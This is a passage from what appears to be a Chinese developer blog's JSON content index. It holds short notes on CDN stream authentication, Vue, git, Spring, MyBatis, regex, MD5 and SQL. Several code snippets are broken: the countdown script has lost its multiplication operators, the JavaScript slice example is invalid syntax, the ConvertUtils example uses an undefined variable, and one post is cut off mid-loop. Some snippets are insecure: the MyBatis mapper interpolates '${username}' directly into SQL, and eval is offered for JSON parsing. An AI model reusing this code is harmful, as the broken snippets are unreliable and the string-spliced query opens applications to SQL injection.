dragon?vhost=live.dragon-yuan.me 鉴权计算：12rtmp://video-center.alivecdn.com/&#123;AppName&#125;/&#123;StreamName&#125;?vhost=&#123;yourdomain&#125;&amp;auth_key=&#123;timestamp&#125;-&#123;rand&#125;-&#123;uid&#125;-&#123;hashvalue&#125; 字段描述12345678timestamp：失效时间=时间戳+有效时间，CDN服务器拿到请求后，首先会判断请求中的失效时间是否小于当前时间，如果小于，则认为过期失效并返回HTTP 403错误。rand：随机数，一般设成0uid：暂未使用（设置成0)hashvalue：通过md5加密算法计算出的32位验证串 推流则需要配置如下：12// FMS(URL) 为 rtmp://video.dragon-yuan.me/live_dragon/// 串流码 为 dragon?vhost=live.dragon-yuan.me&amp;auth_key=.... 收看地址为：1http://live.dragon-yuan.me/live_dragon/dragon.flv?auth_key=....","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"VueJS中watch的使用","slug":"vue-watch","date":"2017-07-28T14:42:30.000Z","updated":"2017-08-01T14:08:54.696Z","comments":true,"path":"2017/07/28/vue-watch/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/28/vue-watch/","excerpt":"","text":"Watch可谓是 Vue中比较重要的部分，检测数据变动后视图更新的重要环节。1234567891011// data中定义一个aShow = false 作为显示变量watch: &#123; 'aForm.obj': function (val, oldVal) &#123; if (val !== '') &#123; this.aShow = true; &#125; else &#123; this.aShow = false; &#125; &#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://blog.dragon-yuan.me/categories/web/"}],"tags":[]},{"title":"GitHub进阶","slug":"github-push","date":"2017-07-27T15:01:26.000Z","updated":"2017-09-12T14:40:09.270Z","comments":true,"path":"2017/07/27/github-push/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/27/github-push/","excerpt":"","text":"1git config --global http.postBuffer 524288000 1234git stash #储藏当前工作git stash list #查看储藏的工作现场git stash apply #恢复工作现场，stash内容并不删除git stash pop #恢复工作现场，并删除stash内容","categories":[{"name":"Github","slug":"Github","permalink":"http://blog.dragon-yuan.me/categories/Github/"}],"tags":[]},{"title":"Spring中AOP对异常的处理","slug":"spring-aop-exception","date":"2017-07-23T07:08:01.000Z","updated":"2017-07-23T07:09:02.970Z","comments":true,"path":"2017/07/23/spring-aop-exception/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/23/spring-aop-exception/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132import com.exception.BusinessException;import java.lang.reflect.Method;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.aop.ThrowsAdvice;public class ExceptionInterceptorLog implements ThrowsAdvice &#123; private static final Logger logger = LoggerFactory.getLogger(ExceptionInterceptorLog.class); public ExceptionInterceptorLog() &#123; &#125; public void afterThrowing(Method method, Object[] args, Object target, BusinessException ex) &#123; logger.error(\"==&gt;ExceptionInterceptorLog.BusinessException\"); logger.error(\"==&gt;errCode:\" + ex.getCode() + \" errMsg:\" + ex.getMessage()); logger.error(\"==&gt;\" + ex.fillInStackTrace()); &#125; public void afterThrowing(Method method, Object[] args, Object target, Exception ex) &#123; logger.error(\"==&gt;ExceptionInterceptorLog.Exception\"); logger.error(\"==&gt;Error class: \" + target.getClass().getName()); logger.error(\"==&gt;Error method: \" + method.getName()); for(int i = 0; i &lt; args.length; ++i) &#123; logger.error(\"==&gt;args[\" + i + \"]: \" + args[i]); &#125; logger.error(\"==&gt;Exception class: \" + ex.getClass().getName()); logger.error(\"==&gt;\" + ex.fillInStackTrace()); logger.error(\"==&gt; 堆栈信息&#123;&#125;\", ex.toString(), ex); &#125;&#125; 在spring-config-aop.xml进行配置12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd\"&gt; &lt;!-- 异常信息 拦截 --&gt; &lt;bean id=\"exceptionInterceptorLog\" class=\"com.xescm.core.exception.ExceptionInterceptorLog\"&gt;&lt;/bean&gt; &lt;aop:config&gt; &lt;aop:pointcut id=\"exceptionTrade\" expression=\" execution(* com.controller.*.*(..)) or execution(* com.controller.*.*(..)) \"/&gt; &lt;aop:advisor pointcut-ref=\"exceptionTrade\" advice-ref=\"exceptionInterceptorLog\"/&gt; &lt;/aop:config&gt;&lt;/beans&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"VueJS中的filters使用","slug":"vue-filters","date":"2017-07-22T12:02:21.000Z","updated":"2017-07-22T12:00:34.416Z","comments":true,"path":"2017/07/22/vue-filters/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/22/vue-filters/","excerpt":"","text":"filters:123456789101112someFilter(way) &#123; let unitName = ''; switch (way) &#123; case '01': &#123; unitName = '名称1'; break; &#125; case '02': &#123; unitName = '名称2'; break; &#125; case '03': &#123; unitName = '名称3'; break; &#125; &#125; return unitName;&#125;// 其他方法调用var val = this.someFilter(value);","categories":[{"name":"web","slug":"web","permalink":"http://blog.dragon-yuan.me/categories/web/"}],"tags":[]},{"title":"什么是原子性","slug":"yuanzixing","date":"2017-07-22T11:14:26.000Z","updated":"2017-07-22T11:41:20.514Z","comments":true,"path":"2017/07/22/yuanzixing/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/22/yuanzixing/","excerpt":"","text":"如果把一个事务可看作是一个程序,它要么完整的被执行,要么完全不执行。这种特性就叫原子性。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"通过SQL语句实现关于随机选择等功能","slug":"SQL-RAND()","date":"2017-07-20T15:34:26.234Z","updated":"2016-12-23T08:36:53.143Z","comments":true,"path":"2017/07/20/SQL-RAND()/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/SQL-RAND()/","excerpt":"","text":"SQL：SELECT * FROM TABLENAME WHERE ??? ORDER BY rand() LIMIT (TIMES); /** TIMES : 从多少条数据中随机查询*/","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Spring Boot事务管理","slug":"springboot-transactional","date":"2017-07-20T15:34:26.231Z","updated":"2017-07-22T12:02:06.735Z","comments":true,"path":"2017/07/20/springboot-transactional/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/springboot-transactional/","excerpt":"","text":"#前言在开发时，由于数操作在顺序执行的过程中，任何一步操作都有可能发生异常，异常会导致后续操作无法完成，此时由于业务逻辑并未正确的完成，之前成功操作数据的并不可靠，需要在这种情况下进行回退。事务的作用就是为了保证用户的每一个操作都是可靠的，事务中的每一步操作都必须成功执行，只要有发生异常就回退到事务开始未进行操作的状态。事务管理是Spring框架中最为常用的功能之一，在开发应用时，大部分情况下也都需要使用事务。 #事务回滚规则事务管理器回滚一个事务的推荐方法是在当前事务的上下文内抛出异常。事务管理器会捕捉任何未处理的异常，然后依据规则决定是否回滚抛出异常的事务。 #操作用@Transactional注解来声明一个函数需要被事务管理，一般在service层使用@Transactional来对各个业务逻辑进行事务管理的配置。 @Transactional 可以作用于接口、接口方法、类以及类方法上。当作用于类上时，该类的所有public方法将都具有该类型的事务属性，同时，也可以在方法级别使用该标注来覆盖类级别的定义。 虽然@Transactional 注解可以作用于接口、接口方法、类以及类方法上，但是 Spring建议不要在接口或者接口方法上使用该注解，因为这只有在使用基于接口的代理时它才会生效。 @Transactional 注解应该只被应用到public方法上，这是由Spring AOP的本质决定的。如果在protected、private或者默认可见性的方法上使用@Transactional注解，这将被忽略，也不会抛出任何异常。 @EnableTransactionManagement开启注解事务管理，等同于xml配置文件中的","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Spring Boot 优雅的入门篇","slug":"springboot-1","date":"2017-07-20T15:34:26.229Z","updated":"2017-04-07T09:22:44.586Z","comments":true,"path":"2017/07/20/springboot-1/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/springboot-1/","excerpt":"","text":"#前言 Spring一直是很火的一个开源框架，之前使用Struts2+Spring框架居多，Spring Boot在社区中 热度一直很高，所以决定花时间来了解和学习，为自己做技术储备。 #正文 Spring Boot其实就是Spring,它做了那些没有它你也会去做的Spring Bean配置。它使用“习惯优 于配置”（项目中存在大量的配置，此外还内置了一个习惯性的配置，让你无需手动进行配置）的理 念让你的项目快速运行起来。使用Spring Boot很容易创建一个独立运行（运行jar,内嵌Servlet 容器）、准生产级别的基于Spring框架的项目，使用Spring Boot你可以不用或者只需要很少的 Spring配置。 #Maven构建项目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!-- SpringBoot --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 添加对jsp视图解析的支持 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- Druid --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.0.29&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 下面两个引入为了操作数据库 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 只需引入spring-boot-devtools 即可实现热部署 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- Log4j --&gt;&lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt; #应用注解类 @SpringBootApplication是Sprnig Boot项目的核心注解，主要目的是开启自动配置。 @RestController 一般用作与接口方式的Controller，返回值为JSON，等价于@Controller+@ResponseBody的结合 @Controller 一般用作页面模式的Controller，返回值可为ModelAndView @EnableAutoConfiguration 允许自动加载配置 @EnableScheduling Spring计划任务 @Autowired 自动注入 @RequestMapping(\"/view.do\") 请求入口 @ResponseBody和@RequestParam同时使用，表示接受前端请求值，并响应返回值 @Repository Dao层注解，用于标注数据访问组件 @Transactional 事务 @Service Service层注解，用于标注业务层组件 #写在最后 Hello World : 初始化一个Spring Boot，添加一个控制类，启动即可。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"jQuery通过内容获取span属性","slug":"span-name-attr","date":"2017-07-20T15:34:26.227Z","updated":"2017-09-06T14:42:16.765Z","comments":true,"path":"2017/07/20/span-name-attr/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/span-name-attr/","excerpt":"","text":"$(\"span:contains('......')\").attr(\"class\");","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"正则表达式 总结","slug":"regular-expressions","date":"2017-07-20T15:34:26.217Z","updated":"2017-01-10T07:29:01.683Z","comments":true,"path":"2017/07/20/regular-expressions/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/regular-expressions/","excerpt":"","text":"网络总结-全部可用 匹配中文：[\\u4e00-\\u9fa5] 匹配双字节字符(包括汉字在内)：[^\\x00-\\xff] 匹配空白行：\\n\\s*\\r 匹配Email地址：/^[^.@]+@[^.@]+.[a-z]+$/ 匹配手机号：/^1(3|4|5|7|8)\\d{9}$/ 匹配网址URL：[a-zA-z]+://[^\\s]* 匹配国内电话号码：\\d{3}-\\d{8}|\\d{4}-{7,8} 匹配腾讯QQ号：[1-9][0-9]{4,} 匹配中国邮政编码：[1-9]\\d{5}(?!\\d) 匹配18位身份证号：^(\\d{6})(\\d{4})(\\d{2})(\\d{2})(\\d{3})([0-9]|X)$ 匹配(年-月-日)格式日期：([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8]))) 匹配正整数：^[1-9]\\d*$ 匹配负整数：^-[1-9]\\d*$ 匹配整数：^-?[1-9]\\d*$ 匹配非负整数（正整数 + 0）：^[1-9]\\d*|0$ 匹配非正整数（负整数 + 0）：^-[1-9]\\d*|0$ 匹配正浮点数：^[1-9]\\d.\\d|0.\\d[1-9]\\d$ 匹配负浮点数：^-[1-9]\\d.\\d|-0.\\d[1-9]\\d$","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"jQuery解析JSON","slug":"jquery-json","date":"2017-07-20T15:34:26.161Z","updated":"2017-09-06T14:42:05.963Z","comments":true,"path":"2017/07/20/jquery-json/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/jquery-json/","excerpt":"","text":"使用全局的JSON对象 function strToJson(str){ return JSON.parse(str); } eval方式解析 function strToJson(str){ var json = eval('(' + str + ')'); return json; }","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"JAVA随机抽取对象","slug":"java-random4j","date":"2017-07-20T15:34:26.144Z","updated":"2017-01-17T03:39:29.703Z","comments":true,"path":"2017/07/20/java-random4j/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/java-random4j/","excerpt":"","text":"/** * @param resultList \"最终抽取结果集\" * @param totalFlag \"最多抽取数量\" * @param canRandomFlag \"可以抽取数量\" * @param personCountNum \"当前需要抽取数量\" */ for(int k = 0; k < personCountNum; k++){ double randomNum = Math.random(); int d = (int)(randomNum * canRandomFlag); Object obj = list.get(d); // 获取抽取对象 resultList.add(obj); // 添加对象到结果集 list.remove(d); // 移除原始采样组 }","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"JAVA随机生成6位验证码","slug":"java-random","date":"2017-07-20T15:34:26.141Z","updated":"2016-12-23T08:32:56.559Z","comments":true,"path":"2017/07/20/java-random/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/java-random/","excerpt":"","text":"public static String createRandomCode() { String code = \"\"; Random r = new Random(); for (int i = 0; i < 6; i++) { code += r.nextInt(10); } return code; }","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"JAVA中正则表达式的使用Pattern","slug":"java-pattern-matcher","date":"2017-07-20T15:34:26.139Z","updated":"2017-02-17T08:30:54.933Z","comments":true,"path":"2017/07/20/java-pattern-matcher/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/java-pattern-matcher/","excerpt":"","text":"String reg = \"^([1-9]\\\\d{0,6}(\\\\.\\\\d{0,}){0,1})$|^(10000000(\\\\.0{0,}){0,1})$\"; Pattern pattern = Pattern.compile(reg); Matcher matcher = pattern.matcher(object); boolean flag = matcher.matches();","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"JAVA中明文转MD5","slug":"java-md5","date":"2017-07-20T15:34:26.131Z","updated":"2016-12-23T08:32:25.834Z","comments":true,"path":"2017/07/20/java-md5/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/java-md5/","excerpt":"","text":"/* * @param plainText 明文 * @return 32位密文 */ public static String encryption(String plainText) { String re_md5 = new String(); try { MessageDigest md = MessageDigest.getInstance(\"MD5\"); md.update(plainText.getBytes()); byte b[] = md.digest(); int i; StringBuffer buf = new StringBuffer(\"\"); for (int offset = 0; offset < b.length; offset++) { i = b[offset]; if (i < 0) i += 256; if (i < 16) buf.append(\"0\"); buf.append(Integer.toHexString(i)); } re_md5 = buf.toString(); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } return re_md5; }","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"List对于remove操作抛出ConcurrentModificationException","slug":"java-list-remove","date":"2017-07-20T15:34:26.129Z","updated":"2017-02-10T09:13:18.405Z","comments":true,"path":"2017/07/20/java-list-remove/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/java-list-remove/","excerpt":"","text":"for(int i=0;i","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"ConvertUtils的简单使用","slug":"java-ConvertUtils","date":"2017-07-20T15:34:26.121Z","updated":"2017-02-10T10:44:33.944Z","comments":true,"path":"2017/07/20/java-ConvertUtils/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/java-ConvertUtils/","excerpt":"","text":"import org.apache.commons.beanutils.ConvertUtils; // 将字符串转换为指定类型 String[] idStringArray = new String[] { \"1\", \"2\", \"3\", \"4\", \"5\" }; Long[] idLongArray = (Long[]) ConvertUtils.convert(idString, Long.class);","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"GitHub上README总结（markdown）","slug":"git-readme","date":"2017-07-20T15:34:26.107Z","updated":"2017-10-13T13:19:25.898Z","comments":true,"path":"2017/07/20/git-readme/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/git-readme/","excerpt":"","text":"1.关于标题 #一级标题 ##二级标题 ###三级标题 ####四级标题 #####五级标题 ######六级标题 2.部分文字的高亮 Thank `You` . Please `Call` Me `Dragon` 3.文字超链接 [我的博客](http://blog.dragon-yuan.me) 4.圆点符 * 一级圆点 * 二级圆点 * 三级圆点 5.缩进 >数据结构 >>树 >>>二叉树 >>>>平衡二叉树 >>>>>满二叉树 6.插入图片 ![](https://pic-href) https://github.com/ 你的用户名 / 你的项目名 / raw / 分支名 / 存放图片的文件夹 / 该文件夹下的图片","categories":[{"name":"GitHub","slug":"GitHub","permalink":"http://blog.dragon-yuan.me/categories/GitHub/"}],"tags":[]},{"title":"找出两个数组中不相同的元素","slug":"different-arrays","date":"2017-07-20T15:34:26.081Z","updated":"2016-12-30T07:02:41.074Z","comments":true,"path":"2017/07/20/different-arrays/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/different-arrays/","excerpt":"","text":"// flagArray为String[] String existsArray[] = new String[]{}; // 与之进行比对的字符集 List list1 = Arrays.asList(flagArray); List list2 = new ArrayList(); // list2用来装载最终字符集 for (String string : existsArray) { if (!list1.contains(string)) { list2.add(string); } }","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"sitemesh布局和修饰框架","slug":"decorators","date":"2017-07-20T15:34:26.078Z","updated":"2017-04-07T10:00:20.662Z","comments":true,"path":"2017/07/20/decorators/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/decorators/","excerpt":"","text":"#简述SiteMesh是一个用来在JSP中实现页面布局和装饰的框架组件，能够较容易实现页面中动态内容和静态装饰外观的分离。 #说明1.首先通过Maven来管理sitemesh12345&lt;dependency&gt; &lt;groupId&gt;opensymphony&lt;/groupId&gt; &lt;artifactId&gt;sitemesh&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt;&lt;/dependency&gt; 2.在web.xml中配置12345678&lt;filter&gt; &lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.opensymphony.sitemesh.webapp.SiteMeshFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 3.decorators.xml装饰器配置文件与web.xml同级放在WEB-INF下。defaultdir为布局文件，pattern表示作用域1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;decorators defaultdir=\"/WEB-INF/layouts/\"&gt; &lt;!-- 禁用装饰器 --&gt; &lt;excludes&gt; &lt;pattern&gt;/static/*&lt;/pattern&gt; &lt;/excludes&gt; &lt;!-- 加载装饰器 --&gt; &lt;decorator name=\"demo\" page=\"default_demo.jsp\"&gt; &lt;pattern&gt;/demo*&lt;/pattern&gt; &lt;/decorator&gt;&lt;/decorators&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"初识JAVA倒计时","slug":"countdown","date":"2017-07-20T15:34:26.072Z","updated":"2016-12-23T08:30:45.856Z","comments":true,"path":"2017/07/20/countdown/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/20/countdown/","excerpt":"","text":".先获取到服务器的时间var nowTdrCommon =&lt;%=System.currentTimeMillis()%&gt;; //服务器时间var nowTdrCommon1 =&lt;%=System.currentTimeMillis()%&gt;; //服务器时间 .获取到结束时间（结束时间为obj）var EndDateTime_cd = obj;var EndDateTime_s = EndDateTime_cd.replace(/-/g, “/“);nowTdrCommon = nowTdrCommon + 1000;var date1 = new Date(nowTdrCommon); //开始时间var date2 = new Date(EndDateTime_s); //结束时间var date3 = date2.getTime() - date1.getTime(); //时间差的毫秒数 //计算出相差天数var days = Math.floor(date3 / (24 3600 1000)); //计算出小时数var leave1 = date3 % (24 3600 1000); //计算天数后剩余的毫秒数var hours = Math.floor(leave1 / (3600 * 1000)); //计算相差分钟数var leave2 = leave1 % (3600 1000); //计算小时数后剩余的毫秒数var minutes = Math.floor(leave2 / (60 1000)); //计算相差秒数var leave3 = leave2 % (60 * 1000); //计算分钟数后剩余的毫秒数var seconds = Math.round(leave3 / 1000); .比较时间，并输出显示剩余时间if (date3 &lt; 0) { return “0”;} else { return ““ + days + “天“ hours + “时“ + minutes “分“ + seconds “秒“;}","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"VueJS中的rules校验","slug":"vue-rules","date":"2017-07-19T15:00:25.000Z","updated":"2017-07-19T15:02:43.085Z","comments":true,"path":"2017/07/19/vue-rules/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/19/vue-rules/","excerpt":"","text":"1234567891011121314151617rules: &#123; rulesOne: [ &#123; required: true, message: '请输入', trigger: 'blur' &#125; ], rulesTwo: [ &#123; max: 100, message: '长度在 100个字符以内', trigger: 'blur' &#125; ], rulesThree: [ &#123; required: true, message: '请选择', trigger: 'change' &#125; ], rulesFour: [ &#123; type: 'array', required: true, message: '请至少选择一个', trigger: 'change' &#125; ], rulesFive: [ &#123; validator: checkSomething, trigger: 'blur' &#125; ]&#125; trigger: ‘blur’为离开输入框trigger: ‘change’为更换下拉框或多选框validator为自定义规则方法名","categories":[{"name":"web","slug":"web","permalink":"http://blog.dragon-yuan.me/categories/web/"}],"tags":[]},{"title":"MyBatis在insert插入操作时返回主键ID（id为自增）","slug":"mybatis-insert-id","date":"2017-07-18T14:52:26.000Z","updated":"2017-07-18T14:55:16.682Z","comments":true,"path":"2017/07/18/mybatis-insert-id/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/18/mybatis-insert-id/","excerpt":"","text":"MySQL用法：1&lt;insert id=\"insert\" parameterType=\"\" keyProperty=\"userId\" useGeneratedKeys=\"true\"&gt; 上面配置中，keyProperty表示返回的id要保存到对象的那个属性中useGeneratedKeys表示主键id为自增长模式 Oracle用法：123456&lt;insert id=\"insert\" parameterType=\"\"&gt; &lt;selectKey resultType=\"INTEGER\" order=\"BEFORE\" keyProperty=\"userId\"&gt; SELECT USER.NEXTVAL as USERID from USER &lt;/selectKey&gt; ...&lt;/insert&gt; 上面配置中，由于Oracle没有自增长，只有序列这种模仿自增的形式，所以不能使用useGeneratedKeys属性","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Array.prototype.slice.call(arguments)","slug":"array-prototype-slice-call","date":"2017-07-18T14:20:22.000Z","updated":"2017-07-18T14:44:36.009Z","comments":true,"path":"2017/07/18/array-prototype-slice-call/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/18/array-prototype-slice-call/","excerpt":"","text":"首先，slice有两个用法，一个是String.slice,一个是Array.slice，第一个返回的是字符串，第二个返回的是数组。Array.prototype.slice.call(arguments)能够将arguments转成数组。123456// length:2var a = &#123;'first','second'&#125;;Array.prototype.slice.call(a); // [\"first\", \"second\"]var a = &#123;&#125;;Array.prototype.slice.call(a); // [undefined, undefined]","categories":[{"name":"web","slug":"web","permalink":"http://blog.dragon-yuan.me/categories/web/"}],"tags":[]},{"title":"Mybatis中Mapper.xml映射文件","slug":"mybatis-mapper","date":"2017-07-16T07:32:21.000Z","updated":"2017-08-17T13:38:25.954Z","comments":true,"path":"2017/07/16/mybatis-mapper/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/16/mybatis-mapper/","excerpt":"","text":"if : Mybatis核心 对sql语句进行灵活操作，通过表达式进行判断，对sql进行灵活拼接、组装。对查询条件进行判断，如果输入参数不为空才进行查询条件拼接。12345678910&lt;select id=\"findUserList\"&gt; select * from user where 1=1 &lt;if test=\"id!=null and id!=''\"&gt; and id=#&#123;id&#125; &lt;/if&gt; &lt;if test=\"username!=null and username!=''\"&gt; and username like '%$&#123;username&#125;%' &lt;/if&gt;&lt;/select&gt; where : 也可以把where写成下面的形式 :1234567891011&lt;select id=\"findUserList\"&gt; select * from user &lt;where&gt; &lt;if test=\"id!=null and id!=''\"&gt; and id=#&#123;id&#125; &lt;/if&gt; &lt;if test=\"username!=null and username!=''\"&gt; and username like '%$&#123;username&#125;%' &lt;/if&gt; &lt;/where&gt;&lt;/select&gt; foreach : 向sql传递数组或List，Mybatis使用foreach解析，如下：如果我们需要传入多个ID来查询多个用户的信息，这也就可以使用foreach。我们先考虑下如果只写sql语句是如下：12345678910&lt;select id=\"selectUserByList\" parameterType=\"java.util.List\" resultType=\"user\"&gt; select * from user &lt;where&gt; &lt;if test=\"list!=null\"&gt; &lt;foreach collection=\"list\" item=\"item\" open=\"and id in(\"separator=\",\"close=\")\"&gt; #&#123;item.id&#125; &lt;/foreach&gt; &lt;/if&gt; &lt;/where&gt;&lt;/select&gt; 如果需要使用到IN关键字，需要传入List并用foreach遍历放入IN中123&lt;foreach item=\"item\" index=\"index\" collection=\"list\" open=\"(\" separator=\",\" close=\")\"&gt; #&#123;item&#125;&lt;/foreach&gt; choose : 标签是按顺序判断其内部when标签中的test条件出否成立，如果有一个成立，则choose结束。当choose中所有when的条件都不满则时，则执行otherwise中的sql类似于Java的switch语句，choose为switch，when为case，otherwise则为default。12345678910111213141516171819&lt;select id=\"getUserList_choose\"&gt; SELECT * FROM User u &lt;where&gt; &lt;choose&gt; &lt;when test=\"username !=null \"&gt; u.username LIKE CONCAT(CONCAT('%', #&#123;username, jdbcType=VARCHAR&#125;),'%') &lt;/when &gt; &lt;when test=\"sex != null and sex != '' \"&gt; AND u.sex = #&#123;sex, jdbcType=INTEGER&#125; &lt;/when &gt; &lt;when test=\"birthday != null \"&gt; AND u.birthday = #&#123;birthday, jdbcType=DATE&#125; &lt;/when &gt; &lt;otherwise&gt; &lt;/otherwise&gt; &lt;/choose&gt; &lt;/where&gt; &lt;/select&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"MySQL子查询","slug":"sub-query-sql","date":"2017-07-16T05:50:22.000Z","updated":"2017-07-16T07:29:16.869Z","comments":true,"path":"2017/07/16/sub-query-sql/","link":"","permalink":"http://blog.dragon-yuan.me/2017/07/16/sub-query-sql/","excerpt":"","text":"子查询：通常在一个SELECT、UPDATE或DELETE语句的WHERE子句中充当查询、修改或删除的条件。例如：在子查询中使用ORDER BY 子句，将查询结果按照deptno列降序输出。12345SELECT empno, ename, sal, d.deptno FROM scott.emp WHERE deptno IN(SELECT deptno FROM scott.emp WHERE empno&gt;7782)ORDER BY empno DESC; 例：查询出每个部门的编号，名称，位置，部门人数，平均工资123456SELECT d.deptno,d.dname,d.loc, (SELECT COUNT(empno) FROM emp WHERE 